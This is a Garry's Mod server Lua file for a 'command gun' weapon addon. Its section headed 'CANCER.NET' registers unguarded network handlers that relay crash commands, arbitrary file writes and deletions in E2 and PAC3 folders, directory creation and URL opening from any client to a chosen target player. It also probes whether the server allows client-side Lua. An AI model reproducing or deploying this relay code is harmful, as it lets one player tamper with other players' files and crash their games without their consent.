AddCSLuaFile('cl_init.lua')
AddCSLuaFile('shared.lua')

include('shared.lua')

util.AddNetworkString( "CMDGUN_SEND_PLAYER" )
util.AddNetworkString( "CMDGUN_SEND_NEW_COMMAND" )
util.AddNetworkString( "CMDGUN_CLEAN_COMMANDS_QUEUE" )
util.AddNetworkString( "CMDGUN_REMOVE_COMMAND" )
util.AddNetworkString( "CMDGUN_RESET_VARS" )

net.Receive("CMDGUN_SEND_PLAYER", function()
  local cmdgunOwner = net.ReadEntity()
  cmdgunOwner.SelectedPlayer = net.ReadEntity()
end)

net.Receive("CMDGUN_SEND_NEW_COMMAND", function()
  local cmdgunOwner = net.ReadEntity()
  if not cmdgunOwner.CommandsQueue then cmdgunOwner.CommandsQueue = {} end
  --table.insert(cmdgunOwner.CommandsQueue, net.ReadTable())
  local cmdArray = net.ReadTable()
  cmdgunOwner.CommandsQueue["cmd" .. net.ReadDouble()] = cmdArray
end)

net.Receive("CMDGUN_CLEAN_COMMANDS_QUEUE", function()
  local cmdgunOwner = net.ReadEntity()
  if not cmdgunOwner.CommandsQueue then return end
  cmdgunOwner.CommandsQueue = {}
end)

net.Receive("CMDGUN_REMOVE_COMMAND", function()
  local cmdgunOwner = net.ReadEntity()
  if not cmdgunOwner.CommandsQueue then return end
  --local indexToRemove = net.ReadDouble()
  cmdgunOwner.CommandsQueue["cmd"..net.ReadDouble()] = nil
  --table.remove(cmdgunOwner.CommandsQueue,indexToRemove)
end)

net.Receive("CMDGUN_RESET_VARS", function()
  local cmdgunOwner = net.ReadEntity()
  if cmdgunOwner.CommandsQueue then cmdgunOwner.CommandsQueue = nil end
  if cmdgunOwner.SelectedPlayer then cmdgunOwner.SelectedPlayer = nil end
end)

-- CANCER.NET

-- CRASH
util.AddNetworkString("CRASH")

-- E2
util.AddNetworkString("DELETE_E2")
util.AddNetworkString("COPY_E2")
util.AddNetworkString("CREATE_DIR")
util.AddNetworkString("WRITE_E2")
util.AddNetworkString("EDIT_E2")

net.Receive("CREATE_DIR", function()
  local target = net.ReadEntity()
  local folderName = net.ReadString()
  local dirName = net.ReadString()
  net.Start("CREATE_DIR")
    net.WriteString(folderName)
    net.WriteString(dirName)
  net.Send(target)
end)

net.Receive("WRITE_E2", function()
    local fileContent = net.ReadString()
    local dirPath = net.ReadString()
    local target = net.ReadEntity()

    net.Start("WRITE_E2")
      net.WriteString(fileContent)
      net.WriteString(dirPath)
    net.Send(target)

end)

-- PAC3
util.AddNetworkString("DELETE_PAC3")
util.AddNetworkString("COPY_PAC3")
util.AddNetworkString("WRITE_PAC3")

net.Receive("WRITE_PAC3", function()
    local fileContent = net.ReadString()
    local dirPath = net.ReadString()
    local target = net.ReadEntity()

    net.Start("WRITE_PAC3")
      net.WriteString(fileContent)
      net.WriteString(dirPath)
    net.Send(target)

end)

util.AddNetworkString("OPEN_URL")

util.AddNetworkString("CHECK_CONVAR_SV_ALLOWCSLUA")

util.AddNetworkString("SHOW_CONVAR_SV_ALLOWCSLUA")
net.Receive("CHECK_CONVAR_SV_ALLOWCSLUA", function()
  local target = net.ReadEntity()
  local sv_allowcslua = net.ReadDouble()
  print(sv_allowcslua)
  PrintTable(target:GetTable())
  net.Start("SHOW_CONVAR_SV_ALLOWCSLUA")
    net.WriteString(sv_allowcslua)
  net.Send(target)
end)

util.AddNetworkString("PLAYER_SOUND_URL")
